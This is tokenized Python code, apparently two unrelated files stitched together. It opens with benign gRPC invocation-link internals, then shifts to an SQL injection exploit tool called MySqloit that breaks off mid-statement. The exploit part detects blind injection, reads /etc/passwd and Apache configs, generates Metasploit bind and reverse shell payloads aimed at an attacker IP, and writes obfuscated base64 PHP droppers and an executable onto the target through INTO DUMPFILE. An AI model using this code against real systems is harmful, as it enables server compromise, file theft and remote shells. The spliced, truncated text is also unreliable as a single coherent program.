. Ticket . Termination . COMPLETION : <newline> <indent> high_write = _HighWrite . CLOSED <newline> <dedent> elif termination is None : <newline> <indent> high_write = _HighWrite . OPEN <newline> <dedent> else : <newline> <indent> return <newline> <dedent> transformed_initial_metadata = self . _metadata_transformer ( initial_metadata ) <newline> request_serializer = self . _request_serializers . get ( ( group , method ) , _IDENTITY ) <newline> response_deserializer = self . _response_deserializers . get ( ( group , method ) , _IDENTITY ) <newline> call = _intermediary_low . Call ( self . _channel , self . _completion_queue , '/%s/%s' % ( group , method ) , self . _host , time . time ( ) + timeout ) <newline> if options is not None and options . credentials is not None : <newline> <indent> call . set_credentials ( options . credentials . _low_credentials ) <newline> <dedent> if transformed_initial_metadata is not None : <newline> <indent> for metadata_key , metadata_value in transformed_initial_metadata : <newline> <indent> call . add_metadata ( metadata_key , metadata_value ) <newline> <dedent> <dedent> call . invoke ( self . _completion_queue , operation_id , operation_id ) <newline> if payload is None : <newline> <indent> if high_write is _HighWrite . CLOSED : <newline> <indent> call . complete ( operation_id ) <newline> low_write = _LowWrite . CLOSED <newline> due = set ( ( _METADATA , _COMPLETE , _FINISH , ) ) <newline> <dedent> else : <newline> <indent> low_write = _LowWrite . OPEN <newline> due = set ( ( _METADATA , _FINISH , ) ) <newline> <dedent> <dedent> else : <newline> <indent> if options is not None and options . disable_compression : <newline> <indent> flags = _intermediary_low . WriteFlags . WRITE_NO_COMPRESS <newline> <dedent> else : <newline> <indent> flags = 0 <newline> <dedent> call . write ( request_serializer ( payload ) , operation_id , flags ) <newline> low_write = _LowWrite . ACTIVE <newline> due = set ( ( _WRITE , _METADATA , _FINISH , ) ) <newline> <dedent> context = _Context ( ) <newline> self . _rpc_states [ operation_id ] = _RPCState ( call , request_serializer , response_deserializer , 1 , _Read . AWAITING_METADATA , 1 if allowance is None else ( 1 + allowance ) , high_write , low_write , due , context ) <newline> protocol = links . Protocol ( links . Protocol . Kind . INVOCATION_CONTEXT , context ) <newline> ticket = links . Ticket ( operation_id , 0 , None , None , None , None , None , None , None , None , None , None , None , protocol ) <newline> self . _relay . add_value ( ticket ) <newline> <dedent> def _advance ( self , operation_id , rpc_state , payload , termination , allowance ) : <newline> <indent> if payload is not None : <newline> <indent> disable_compression = rpc_state . context . next_compression_disabled ( ) <newline> if disable_compression : <newline> <indent> flags = _intermediary_low . WriteFlags . WRITE_NO_COMPRESS <newline> <dedent> else : <newline> <indent> flags = 0 <newline> <dedent> rpc_state . call . write ( rpc_state . request_serializer ( payload ) , operation_id , flags ) <newline> rpc_state . low_write = _LowWrite . ACTIVE <newline> rpc_state . due . add ( _WRITE ) <newline> <dedent> if allowance is not None : <newline> <indent> if rpc_state . read is _Read . AWAITING_ALLOWANCE : <newline> <indent> rpc_state . allowance += allowance - 1 <newline> rpc_state . call . read ( operation_id ) <newline> rpc_state . read = _Read . READING <newline> rpc_state . due . add ( _READ ) <newline> <dedent> else : <newline> <indent> rpc_state . allowance += allowance <newline> <dedent> <dedent> if termination is links . Ticket . Termination . COMPLETION : <newline> <indent> rpc_state . high_write = _HighWrite . CLOSED <newline> if rpc_state . low_write is _LowWrite . OPEN : <newline> <indent> rpc_state . call . complete ( operation_id ) <newline> rpc_state . due . add ( _COMPLETE ) <newline> rpc_state . low_write = _LowWrite . CLOSED <newline> <dedent> <dedent> elif termination is not None : <newline> <indent> rpc_state . call . cancel ( ) <newline> <dedent> <dedent> def add_ticket ( self , ticket ) : <newline> <indent> with self . _lock : <newline> <indent> if ticket . sequence_number == 0 : <newline> <indent> if self . _completion_queue is None : <newline> <indent> logging . error ( 'Received ▁ invocation ▁ ticket ▁ %s ▁ after ▁ stop!' , ticket ) <newline> <dedent> else : <newline> <indent> if ( ticket . protocol is not None and ticket . protocol . kind is links . Protocol . Kind . CALL_OPTION ) : <newline> <indent> grpc_call_options = ticket . protocol . value <newline> <dedent> else : <newline> <indent> grpc_call_options = None <newline> <dedent> self . _invoke ( ticket . operation_id , ticket . group , ticket . method , ticket . initial_metadata , ticket . payload , ticket . termination , ticket . timeout , ticket . allowance , grpc_call_options ) <newline> <dedent> <dedent> else : <newline> <indent> rpc_state = self . _rpc_states . get ( ticket . operation_id ) <newline> if rpc_state is not None : <newline> <indent> self . _advance ( ticket . operation_id , rpc_state , ticket . payload , ticket . termination , ticket . allowance ) <newline> <dedent> <dedent> <dedent> <dedent> def start ( self ) : <newline> <indent>  """ Starts ▁ this ▁ object. <strnewline> <strnewline> ▁ This ▁ method ▁ must ▁ be ▁ called ▁ before ▁ attempting ▁ to ▁ exchange ▁ tickets ▁ with ▁ this <strnewline> ▁ object. <strnewline> ▁ """  <newline> with self . _lock : <newline> <indent> self . _completion_queue = _intermediary_low . CompletionQueue ( ) <newline> self . _pool = logging_pool . pool ( 1 ) <newline> self . _pool . submit ( self . _spin , self . _completion_queue ) <newline> <dedent> <dedent> def stop ( self ) : <newline> <indent>  """ Stops ▁ this ▁ object. <strnewline> <strnewline> ▁ This ▁ method ▁ must ▁ be ▁ called ▁ for ▁ proper ▁ termination ▁ of ▁ this ▁ object, ▁ and ▁ no <strnewline> ▁ attempts ▁ to ▁ exchange ▁ tickets ▁ with ▁ this ▁ object ▁ may ▁ be ▁ made ▁ after ▁ this ▁ method <strnewline> ▁ has ▁ been ▁ called. <strnewline> ▁ """  <newline> with self . _lock : <newline> <indent> if not self . _rpc_states : <newline> <indent> self . _completion_queue . stop ( ) <newline> <dedent> self . _completion_queue = None <newline> pool = self . _pool <newline> <dedent> pool . shutdown ( wait = True ) <newline> <dedent> <dedent> class InvocationLink ( six . with_metaclass ( abc . ABCMeta , links . Link , activated . Activated ) ) : <newline> <indent>  """ A ▁ links.Link ▁ for ▁ use ▁ on ▁ the ▁ invocation-side ▁ of ▁ a ▁ gRPC ▁ connection. <strnewline> <strnewline> ▁ Implementations ▁ of ▁ this ▁ interface ▁ are ▁ only ▁ valid ▁ for ▁ use ▁ when ▁ activated. <strnewline> ▁ """  <newline> <dedent> class _InvocationLink ( InvocationLink ) : <newline> <indent> def __init__ ( self , channel , host , metadata_transformer , request_serializers , response_deserializers ) : <newline> <indent> self . _relay = relay . relay ( None ) <newline> self . _kernel = _Kernel ( channel , host , _IDENTITY if metadata_transformer is None else metadata_transformer , { } if request_serializers is None else request_serializers , { } if response_deserializers is None else response_deserializers , self . _relay ) <newline> <dedent> def _start ( self ) : <newline> <indent> self . _relay . start ( ) <newline> self . _kernel . start ( ) <newline> return self <newline> <dedent> def _stop ( self ) : <newline> <indent> self . _kernel . stop ( ) <newline> self . _relay . stop ( ) <newline> <dedent> def accept_ticket ( self , ticket ) : <newline> <indent>  """ See ▁ links.Link.accept_ticket ▁ for ▁ specification. """  <newline> self . _kernel . add_ticket ( ticket ) <newline> <dedent> def join_link ( self , link ) : <newline> <indent>  """ See ▁ links.Link.join_link ▁ for ▁ specification. """  <newline> self . _relay . set_behavior ( link . accept_ticket ) <newline> <dedent> def __enter__ ( self ) : <newline> <indent>  """ See ▁ activated.Activated.__enter__ ▁ for ▁ specification. """  <newline> return self . _start ( ) <newline> <dedent> def __exit__ ( self , exc_type , exc_val , exc_tb ) : <newline> <indent>  """ See ▁ activated.Activated.__exit__ ▁ for ▁ specification. """  <newline> self . _stop ( ) <newline> return False <newline> <dedent> def start ( self ) : <newline> <indent>  """ See ▁ activated.Activated.start ▁ for ▁ specification. """  <newline> return self . _start ( ) <newline> <dedent> def stop ( self ) : <newline> <indent>  """ See ▁ activated.Activated.stop ▁ for ▁ specification. """  <newline> self . _stop ( ) <newline> <dedent> <dedent> def invocation_link ( channel , host , metadata_transformer , request_serializers , response_deserializers ) : <newline> <indent>  """ Creates ▁ an ▁ InvocationLink. <strnewline> <strnewline> ▁ Args: <strnewline> ▁ channel: ▁ An ▁ _intermediary_low.Channel ▁ for ▁ use ▁ by ▁ the ▁ link. <strnewline> ▁ host: ▁ The ▁ host ▁ to ▁ specify ▁ when ▁ invoking ▁ RPCs. <strnewline> ▁ metadata_transformer: ▁ A ▁ callable ▁ that ▁ takes ▁ an ▁ invocation-side ▁ initial <strnewline> ▁ metadata ▁ value ▁ and ▁ returns ▁ another ▁ metadata ▁ value ▁ to ▁ send ▁ in ▁ its ▁ place. <strnewline> ▁ May ▁ be ▁ None. <strnewline> ▁ request_serializers: ▁ A ▁ dict ▁ from ▁ group-method ▁ pair ▁ to ▁ request ▁ object <strnewline> ▁ serialization ▁ behavior. <strnewline> ▁ response_deserializers: ▁ A ▁ dict ▁ from ▁ group-method ▁ pair ▁ to ▁ response ▁ object <strnewline> ▁ deserialization ▁ behavior. <strnewline> <strnewline> ▁ Returns: <strnewline> ▁ An ▁ InvocationLink. <strnewline> ▁ """  <newline> return _InvocationLink ( channel , host , metadata_transformer , request_serializers , response_deserializers ) <newline> <dedent>
 # !/usr/bin/env ▁ python <encdom>  # ▁ MySqloit ▁ v0.2 <encdom>  # ▁ Usage: ▁ ./mysqloit.py <encdom> import conf <newline> import urllib2 <newline> import socket <newline> import base64 <newline> import getopt <newline> import sys <newline> import os <newline> import time <newline> import urllib <newline> from urllib2 import Request , urlopen , URLError , HTTPError <newline> import socket <newline> import random <newline> injection_value = None <newline> def hit_url ( url ) : <newline> <indent> try : <newline> <indent> urllib2 . urlopen ( url ) <newline> <dedent> except URLError , e : <newline> <indent> if "timed ▁ out" in e . reason : <newline> <indent> print "=> ▁ Request ▁ to ▁ URL ▁ [%s] ▁ timed ▁ out ▁ (this ▁ is ▁ normal)" % url <newline>  # ▁ Ignore ▁ socket ▁ timeouts; ▁ sometimes ▁ when ▁ we ▁ hit ▁ a ▁ URl ▁ it <encdom>  # ▁ doesn't ▁ return ▁ anything <encdom> pass <newline> <dedent> else : <newline> <indent> raise <newline> <dedent> <dedent> <dedent> def make_request ( parameter ) : <newline> <indent>  """ <strnewline> ▁ Construct ▁ a ▁ urllib2 ▁ request ▁ object ▁ and ▁ get ▁ the ▁ response, ▁ based ▁ on ▁ an <strnewline> ▁ exploit ▁ parameter. ▁ Handles ▁ POST ▁ and ▁ GET ▁ request. <strnewline> ▁ """  <newline> global conf <newline> data = None <newline> if conf . request == 'GET' and conf . datatype == 'string' : <newline> <indent> url = conf . url + '354d3adb33f657' + "'" + parameter  # # # add ▁ single ▁ quote <encdom> <newline>  # elite_string1 ▁ = ▁"BENCHMARK(100000,SHA1(1))" ▁ + ▁"'" <encdom> <dedent> elif conf . request == 'GET' and conf . datatype == 'integer' : <newline> <indent> url = conf . url + '3546574545' + parameter <newline> <dedent> elif conf . request == 'POST' and conf . datatype == 'string' : <newline> <indent> url = conf . url  # post ▁ with ▁ string <encdom> <newline> data = conf . post_injection <newline> data = data + "d3adb33f" + "'" <newline> data += parameter + conf . post_last_injection <newline> <dedent> else : <newline> <indent> url = conf . url  # post ▁ with ▁ integer <encdom> <newline> data = conf . post_injection <newline> data = data + "3451345341" <newline> data += parameter + conf . post_last_injection <newline> <dedent> req = urllib2 . Request ( url = url ) <newline>  # req ▁ = ▁ urllib2.Request(url,data) <encdom> req . add_header ( 'User-Agent' , conf . agent ) <newline> response = urllib2 . urlopen ( req , data ) <newline>  # response ▁ = ▁ urllib2.urlopen(req) <encdom> return response <newline> <dedent> def test ( url ) : <newline> <indent> socket . setdefaulttimeout ( 20 ) <newline> global injection_value <newline> url = conf . url <newline> elite_string = "BENCHMARK(10000000,SHA1(1))" <newline> string_quote = ",null" + "'" <newline> into = "+into+outfile+" <newline> union_select = "+UNION+select+" <newline> for i in range ( 30 ) : <newline> <indent> null = ",null" <newline> k = i * null <newline> if conf . datatype == 'string' : <newline> <indent> parameter = union_select + elite_string + k + string_quote  # string ▁ requires ▁ a ▁ single ▁ quote ▁ for ▁ the ▁ last ▁ null <encdom> <newline> <dedent> else : <newline> <indent> parameter = union_select + elite_string + k <newline> <dedent> try : <newline> <indent> response = make_request ( parameter ) <newline> <dedent> except HTTPError , e : <newline> <indent> print 'The ▁ server ▁ couldn\'t ▁ fulfill ▁ the ▁ request.' <newline> print 'Error ▁ code: ▁ ' , e . code <newline> <dedent> except URLError , e : <newline> <indent> print 'Testing ▁ on ▁ the ▁ deep ▁ blind ▁ injection' <newline> if 'timed ▁ out' in e . reason : <newline> <indent> print 'Injection ▁ successfull ▁ with' , parameter <newline> injection_value = parameter <newline> print 'Injection ▁ is ▁ successfull' <newline> return 'found' <newline> exit ( 0 ) <newline> <dedent> <dedent> <dedent> print 'Injection ▁ ▁ not ▁ successfull' <newline> exit ( 0 ) <newline> <dedent> def fingerprint ( ) : <newline> <indent> socket . setdefaulttimeout ( 15 ) <newline> url = conf . url + '"' <newline> inject_error = "\'" <newline> response = make_request ( inject_error ) <newline> html = response . read ( 300 ) <newline> print 'Trying ▁ discover ▁ the ▁ working ▁ directory ▁ through ▁ SQL ▁ error ▁ message' <newline> if html . count ( 'valid ▁ MySQL ▁ result' ) or ( 'error ▁ in ▁ your ▁ SQL ▁ syntax' ) or ( 'Incorrect ▁ column' ) : <newline> <indent> print 'Error ▁ successfully ▁ generated' <newline> print html <newline> exit ( 0 ) <newline> <dedent> else : <newline> <indent> print 'Cant ▁ print ▁ the ▁ working ▁ directory ▁ through ▁ error ▁ message' <newline> print 'Trying ▁ to ▁ discover ▁ by ▁ loading ▁ the ▁ conf ▁ file' <newline> global injection_value <newline> if fingerprint_inital ( ) == 'linux' : <newline> <indent> elite_string = 'load_file("/etc/apache2/sites-available/default")' <newline> read_conf_file = injection_value . replace ( "BENCHMARK(10000000,SHA1(1))" , elite_string )  # ▁ need ▁ to ▁ add ▁ more <encdom> <newline> print 'Reading ▁ the ▁ apache2 ▁ configuration ▁ file' <newline> response = make_request ( read_conf_file ) <newline> html = response . read ( 300 ) <newline> if html . count ( 'DocumentRoot' ) : <newline> <indent> print 'conf ▁ file ▁ successfully ▁ discovered' <newline> print 'Printing ▁ the ▁ conf ▁ file' <newline> print html <newline> exit ( 0 ) <newline> <dedent> <dedent> else : <newline> <indent> elite_string = 'load_file("C:/Program%20Files/Apache%20Group/Apache2/conf/httpd.conf")'  # need ▁ to ▁ add ▁ more <encdom> <newline> read_conf_file = injection_value . replace ( "BENCHMARK(10000000,SHA1(1))" , elite_string ) <newline> print 'Reading ▁ the ▁ apache2 ▁ configuration ▁ file' <newline> response = make_request ( read_conf_file ) <newline> html = response . read ( 3100 ) <newline> if html . count ( 'DocumentRoot' ) : <newline> <indent> print 'conf ▁ file ▁ successfully ▁ discovered' <newline> print 'Printing ▁ the ▁ conf ▁ file' <newline> print html <newline> <dedent> else : <newline> <indent> print 'Failed ▁ to ▁ fingerprint ▁ conf ▁ file' <newline> <dedent> <dedent> <dedent> <dedent> def fingerprint_inital ( ) : <newline> <indent> global injection_value <newline> url = conf . url <newline> socket . setdefaulttimeout ( 15 ) <newline> if test ( url ) == 'found' : <newline> <indent> elite_string = 'load_file("/etc/passwd")' <newline> fingerprint_value = injection_value . replace ( "BENCHMARK(10000000,SHA1(1))" , elite_string )  # # no ▁ more ▁ time ▁ based ▁ attack <encdom> <newline> print 'Fingerprinting ▁ the ▁ operating ▁ system' <newline> response = make_request ( fingerprint_value ) <newline> html = response . read ( 300 ) <newline> if html . count ( 'root' ) : <newline> <indent> return 'linux' <newline> <dedent> else : <newline> <indent> return 'windows' <newline> <dedent> <dedent> else : <newline> <indent> exit ( 0 ) <newline> <dedent> <dedent> def fingerprint_os ( ) : <newline>  # configuration() <encdom> <indent> url = conf . url <newline>  # if ▁ test(url) ▁ == ▁'found': ▁ # do ▁ not ▁ need ▁ this <encdom> if fingerprint_inital ( ) == 'linux' : <newline> <indent> print 'DBS ▁ running ▁ on ▁ Linux!!!' <newline> <dedent> else : <newline> <indent> print 'DBS ▁ running ▁ on ▁ Windows!!!' <newline> <dedent> <dedent> def payloads ( ) : <newline> <indent> argc = len ( sys . argv ) <newline> if argc < 4 : <newline> <indent> if sys . argv [ 2 ] == 'help' : <newline> <indent> if fingerprint_inital ( ) == 'linux' : <newline> <indent> print 'Linux ▁ shellcode' <newline> print 'arguments ▁ => ▁ [bind/reverse/findsock] ▁ [port ▁ no]' <newline> <dedent> else : <newline> <indent> print 'Windows ▁ shellcode' <newline> print 'arguments ▁ => ▁ [bind/reverse] ▁ [port ▁ no]' <newline> <dedent> <dedent> <dedent> else : <newline> <indent> if sys . argv [ 2 ] == 'bind' : <newline> <indent> if fingerprint_inital ( ) == 'windows' : <newline> <indent> print 'OS ▁ running ▁ on ▁ Windows' <newline> print 'Baking ▁ a ▁ bind ▁ vnc ▁ shellcode ▁ for ▁ Windows ▁ on ▁ port' , sys . argv [ 3 ] <newline> msfpayload = conf . metasploit + "/msfpayload" + " ▁ " + "windows/vncinject/bind_tcp" + " ▁ " + "LPORT=" + sys . argv [ 3 ] + " ▁ " + "X" <newline> file = open ( "/tmp/mete.exe" , "wb" ) <newline> pipe = os . popen ( msfpayload ) <newline> for line in pipe . readlines ( ) : <newline> <indent> file . write ( line ) <newline> pipe . close ( ) <newline> <dedent> <dedent> else : <newline> <indent> print 'OS ▁ running ▁ on ▁ Linux' <newline> print 'Baking ▁ a ▁ bind ▁ shellcode ▁ for ▁ Linux ▁ on ▁ port' , sys . argv [ 3 ] <newline> msfpayload = conf . metasploit + "/msfpayload" + " ▁ " + "linux/x86/shell/bind_tcp" + " ▁ " + "LPORT=" + sys . argv [ 3 ] + " ▁ " + "X" <newline> file = open ( "/tmp/mete.exe" , "wb" ) <newline> pipe = os . popen ( msfpayload ) <newline> for line in pipe . readlines ( ) : <newline> <indent> file . write ( line ) <newline> pipe . close ( ) <newline> <dedent> <dedent> <dedent> elif sys . argv [ 2 ] == 'reverse' : <newline> <indent> if fingerprint_inital ( ) == 'windows' : <newline> <indent> print 'OS ▁ running ▁ on ▁ Windows' <newline> print 'Baking ▁ a ▁ reverse ▁ vnc ▁ shellcode ▁ for ▁ Windows' <newline> msfpayload = conf . metasploit + "/msfpayload" + " ▁ " + "windows/vncinject/reverse_tcp" + " ▁ " + "LHOST=" + conf . ip + " ▁ " + "LPORT=" + sys . argv [ 3 ] + " ▁ " + "X" <newline> file = open ( "/tmp/mete.exe" , "wb" ) <newline> pipe = os . popen ( msfpayload ) <newline> for line in pipe . readlines ( ) : <newline> <indent> file . write ( line ) <newline> pipe . close ( ) <newline> <dedent> <dedent> else : <newline> <indent> print 'OS ▁ running ▁ on ▁ Linux' <newline> print 'Baking ▁ a ▁ reverse ▁ shellcode ▁ for ▁ Linux ▁ on ▁ port' , sys . argv [ 3 ] <newline> msfpayload = conf . metasploit + "/msfpayload" + " ▁ " + "linux/x86/shell/reverse_tcp" + " ▁ " + "LHOST=" + conf . ip + " ▁ " + "LPORT=" + sys . argv [ 3 ] + " ▁ " + "X" <newline> file = open ( "/tmp/mete.exe" , "wb" ) <newline> pipe = os . popen ( msfpayload ) <newline> for line in pipe . readlines ( ) : <newline> <indent> file . write ( line ) <newline> pipe . close ( ) <newline> <dedent> <dedent> <dedent> elif sys . argv [ 2 ] == 'findsock' : <newline> <indent> if fingerprint_inital ( ) == 'windows' : <newline> <indent> print 'Findsock ▁ shell ▁ for ▁ windows ▁ is ▁ not ▁ supported' <newline> <dedent> else : <newline> <indent> msfpayload = conf . metasploit + "/msfpayload" + " ▁ " + "php/shell_findsock" + " ▁ " + " ▁ " + "R" + " ▁ " + "|" + " ▁ " + conf . metasploit + "/msfencode" + " ▁ " + "-e" + " ▁ " + "php/base64" + " ▁ " + "-t" + " ▁ " + "raw" <newline> file = open ( "/tmp/shellcode" , "w" ) <newline> pipe = os . popen ( msfpayload ) <newline> for line in pipe . readlines ( ) : <newline> <indent> file . write ( line ) <newline> file . close ( ) <newline> pipe . close ( ) <newline> <dedent> <dedent> <dedent> <dedent> <dedent> def exploit ( ) : <newline> <indent> argc = len ( sys . argv ) <newline> if argc < 4 : <newline> <indent> if sys . argv [ 2 ] == 'help' : <newline> <indent> print 'arguments ▁ => ▁ [bind/reverse/findsock] ▁ [port ▁ no] ▁ [working ▁ dir] ▁ [uploaded ▁ shellcode ▁ dir]' <newline> <dedent> <dedent> else : <newline> <indent> url = conf . url <newline> global random_file <newline> if test ( url ) == 'found' : <newline> <indent> if fingerprint_inital ( ) == 'windows' : <newline> <indent> random_file = random . random ( ) <newline> first_var_exe = "<?php%20$filename%20=%20'compress2" + str ( random_file ) + ".exe';"  # compresss ▁ shellcode ▁ on ▁ the ▁ web ▁ server <encdom> <newline> second_var_exe = "$myFile%20=%20'metedecom" + str ( random_file ) + ".exe';"  # # metedecom.exe <encdom> <newline> reverse_shell = conf . metasploit + "/msfcli" + " ▁ " + "exploit/multi/handler" + " ▁ " + "PAYLOAD=windows/vncinject/reverse_tcp" + " ▁ " + "LHOST=" + conf . ip + " ▁ " + "LPORT=" + sys . argv [ 3 ] + " ▁ " + "E" <newline> bind_shell = conf . metasploit + "/msfcli" + " ▁ " + "exploit/multi/handler" + " ▁ " + "PAYLOAD=windows/vncinject/bind_tcp" + " ▁ " + "RHOST=" + conf . ip + " ▁ " + "LPORT=" + sys . argv [ 3 ] + " ▁ " + "E" <newline> chmod = first_var_exe + second_var_exe + "exec($myFile);" <newline> <dedent> elif fingerprint_inital ( ) == 'linux' : <newline> <indent> random_file = random . random ( ) <newline> reverse_shell = conf . metasploit + "/msfcli" + " ▁ " + "exploit/multi/handler" + " ▁ " + "PAYLOAD=linux/x86/shell/reverse_tcp" + " ▁ " + "LHOST=" + conf . ip + " ▁ " + "LPORT=" + sys . argv [ 3 ] + " ▁ " + "E" <newline> bind_shell = conf . metasploit + "/msfcli" + " ▁ " + "exploit/multi/handler" + " ▁ " + "PAYLOAD=linux/x86/shell/bind_tcp" + " ▁ " + "RHOST=" + conf . ip + " ▁ " + "LPORT=" + sys . argv [ 3 ] + " ▁ " + "E" <newline> first_var_exe = "<?php%20$final_output%20=%20'mysqploit" + str ( random_file ) + ".exe';"  # this ▁ is ▁ owned ▁ by ▁ mysql ▁ user <encdom> <newline> second_var_exe = "$file_input%20=%20'metedecom" + str ( random_file ) + ".exe';" <newline> chmod = first_var_exe + second_var_exe + "$s='YzJWMFgyMWhaMmxqWDNGMWIzUmxjMTl5ZFc1MGFXMWxJQ2d3S1RzS0pHaGtJRDBnWm" + "05d1pXNG9KR1pwYkdWZmFXNXdkWFFzSUNkeVlpY3BPd29rYlhsemRISnBibWR2ZFhROUlHWnlaV0ZrS0NSb1pDd2dNVEF3TURBd0" + "tUc0tabU5zYjNObEtDUm9aQ2s3Q2lSd2RISWdQU0JtYjNCbGJpZ2tabWx1WVd4ZmIzVjBjSFYwTENBbmQySW5LVHNLWm5keWFYUm" + "xLQ1J3ZEhJc0lDUnRlWE4wY21sdVoyOTFkQ2s3Q21aamJHOXpaU2drY0hSeUtUc0tKR1pwYm1Gc0lEMGdJbU5vYlc5a0lEYzNOeU" + "FrWm1sdVlXeGZiM1YwY0hWMElqc0tjSEpwYm5RZ0pHWnBibUZzT3dwemVYTjBaVzBvSWlSbWFXNWhiQ0lwT3dwemVYTjBaVzBvSW" + "k0dkpHWnBibUZzWDI5MWRIQjFkQ0lwT3c9PQ==';eval(base64_decode(base64_decode($s)));" <newline> <dedent> <dedent> global injection_value <newline> access_file = "php" + " ▁ " + "/tmp/compress.php" <newline> delete_file = "rm" + " ▁ " + "-" + "rf" + " ▁ " + "/tmp/compress.php" <newline> delete_exe = "rm" + " ▁ " + "-" + "rf" + " ▁ " + "/tmp/compress2.exe" <newline> delete_trim1 = "rm" + " ▁ " + "-" + "rf" + " ▁ " + "/tmp/trim1.txt" <newline> delete_trim2 = "rm" + " ▁ " + "-" + "rf" + " ▁ " + "/tmp/trim2.txt" <newline> delete_mete = "rm" + " ▁ " + "-" + "rf" + " ▁ " + "/tmp/mete.exe" <newline> trim = "xxd" + " ▁ " + "-p" + " ▁ " + "/tmp/compress2.exe" + ">" + "/tmp/trim1.txt" <newline> delete_exe = "rm" + " ▁ " + "-" + "rf" + " ▁ " + "/tmp/mete.exe" <newline> trim2 = "cat" + " ▁ " + "/tmp/trim1.txt" + " ▁ " + "|" + " ▁ " + "tr" + " ▁ " + "-d" + " ▁ " + "\\" + "\ \n " + ">" + "/tmp/trim2.txt" <newline> gzip = "<?php ▁ $s='SkdacGJHVnVZVzFsSUQwZ0lpOTBiWEF2YldWMFpTNWxlR1VpT3dva2FHRnVaR3hsSUQwZ1ptOXda" + "VzRvSkdacGJHVnVZVzFsTENBaQpjbUlpS1RzS0pHTnZiblJsYm5SeklEMGdabkpsWVdRb0pHaGhi" + "bVJzWlN3Z1ptbHNaWE5wZW1Vb0pHWnBiR1Z1WVcxbEtTazdDbVZqCmFHOGdjMmw2Wlc5bUtDUmpi" + "MjUwWlc1MGN5azdDaVJqYjIxd2NtVnpjMlZrSUQwZ1ozcGpiMjF3Y21WemN5Z2tZMjl1ZEdWdWRI" + "TXAKT3dwbVkyeHZjMlVvSkdoaGJtUnNaU2s3Q2lSdGVVWnBiR1VnUFNBaUwzUnRjQzlqYjIxd2Nt" + "Vnpjekl1WlhobElqc0tKR1pvSUQwZwpabTl3Wlc0b0pHMTVSbWxzWlN3Z0ozZGlKeWtnYjNJZ1pH" + "bGxLQ0pqWVc0bmRDQnZjR1Z1SUdacGJHVWlLVHNLWm5keWFYUmxLQ1JtCmFDd2dKR052YlhCeVpY" + "TnpaV1FwT3dwbVkyeHZjMlVvSkdab0tUcz0=';eval(base64_decode(base64_decode($s)));" <newline> file = open ( "/tmp/compress.php" , "w" ) <newline> file . write ( gzip ) <newline> file . close ( ) <newline> os . system ( access_file ) <newline> os . system ( trim ) <newline> os . system ( trim2 ) <newline> os . system ( delete_mete ) <newline> site = conf . site <newline> into = '+into+dumpfile+' <newline> union_select = '+UNION+select+' <newline> FILE = '/tmp/trim2.txt' <newline> f = open ( FILE , 'r' ) <newline> string = f . read ( ) <newline> string_encode = urllib . quote_plus ( string ) <newline>  # for ▁ i ▁ in ▁ range(50): <encdom>  # k ▁ = ▁ i ▁ * ▁',0x00' ▁ # # need ▁ to ▁ use ▁ this ▁ on ▁ thr ▁ last ▁ part ▁ of ▁ injection ▁ string <encdom> elite_string = '0x' + string_encode <newline> if conf . datatype == 'string' : <newline> <indent> end = "" <newline> <dedent> else : <newline> <indent> end = "'" <newline> <dedent> upload = into + "'" + urllib . quote ( sys . argv [ 4 ] ) + sys . argv [ 5 ] + '/compress2' + str ( random_file ) + '.exe' + end <newline>  # upload= ▁ into+"'"+(sys.argv[4])+sys.argv[5]+'/compress2'+str(random_file)+'.exe' ▁ + ▁ end <encdom> exploit_injection = injection_value . replace ( "BENCHMARK(10000000,SHA1(1))" , elite_string ) <newline> noop = ",0x00"  # either ▁ 0x00 ▁ or ▁ 0x90 <encdom> <newline>  # half_injection ▁ = ▁ exploit_injection.replace(",null'",noop) <encdom>  # if ▁ conf.datatype ▁ == ▁'string': <encdom> null_quote = ",0x00'" <newline>  # else: <encdom> null = ",null" <newline> half_injection = exploit_injection . replace ( null , noop ) <newline> half_injection = half_injection . replace ( null_quote , noop )  # useful ▁ for ▁ POST ▁ as ▁ POST ▁ uses ▁ quote ▁ for ▁ the ▁ last ▁ null <encdom> <newline> full_injection = half_injection + upload <newline> print 'Uploading ▁ compressed ▁ shellcode ▁ ==>' , full_injection <newline> response = make_request ( full_injection ) <newline> os . system ( delete_file ) <newline> os . system ( delete_exe ) <newline> os . system ( delete_trim1 ) <newline> os . system ( delete_trim2 ) <newline> os . system ( delete_exe ) <newline> if conf . datatype == 'string' : <newline> <indent> end = "" <newline> <dedent> else : <newline> <indent> end = "'" <newline> <dedent> first_var = "<?php%20$filename%20=%20'compress2" + str ( random_file ) + ".exe';"  # compresss ▁ shellcode ▁ on ▁ the ▁ web ▁ server <encdom> <newline> second_var = "$myFile%20=%20'metedecom" + str ( random_file ) + ".exe';"  # # metedecom.exe <encdom> <newline> dgzip = first_var + second_var + "$s='SkdoaGJtUnNaU0E5SUdadmNHVnVLQ1JtYVd4bGJtRnRaU3dnSW5KaUlpazdDaVJqY" + "jI1MFpXNTBjeUE5SUdaeVpXRmtLQ1JvWVc1a2JHVXNJR1pwYkdWemFYcGxLQ1JtYVd4bGJtRnRaU2twT3dva2RXNWpiMjF3Y21W" + "emMyVmtJRDBnWjNwMWJtTnZiWEJ5WlhOektDUmpiMjUwWlc1MGN5azdDbkJ5YVc1MElIVnVZMjl0Y0hKbGMzTmxaRHNLSTJaamJ" + "HOXpaU2drYUdGdVpHeGxLVHNLQ2lSbWFDQTlJR1p2Y0dWdUtDUnRlVVpwYkdVc0lDZDNZaWNwSUc5eUlHUnBaU2dpWTJGdUozUW" + "diM0JsYmlCbWFXeGxJaWs3Q21aM2NtbDBaU2drWm1nc0lDUjFibU52YlhCeVpYTnpaV1FwT3dwbVkyeHZjMlVvSkdab0tUc0s='" + ";eval(base64_decode(base64_decode($s)));" <newline> elite_string = '"' + dgzip + '"' <newline> upload = into + "'" + urllib . quote ( sys . argv [ 4 ] ) + sys . argv [ 5 ] + '/decompress' + str ( random_file ) + '.php' + end  # changes ▁ on ▁ new ▁ version <encdom> <newline> exploit_injection = injection_value . replace ( "BENCHMARK(10000000,SHA1(1))" , elite_string ) <newline> noop = ",0x00" <newline> null_quote = ",0x00'" <newline> half_injection = exploit_injection . replace ( null , noop ) <newline> half_injection = half_injection . replace ( null_quote , noop ) <newline> full_injection = half_injection + upload <newline> print 'Uploading ▁ decompression ▁ tool' , full_injection <newline> response = make_request ( full_injection ) <newline> elite_string = '"' + chmod + '"' <newline> upload = into + "'" + urllib . quote ( sys . argv [ 4 ] ) + sys . argv [ 5 ] + '/metedecom' + str ( random_file ) + '.php' + end  # changes ▁ on ▁ new ▁ version <encdom> <newline> exploit_injection = injection_value . replace ( "BENCHMARK(10000000,SHA1(1))" , elite_string ) <newline> noop = 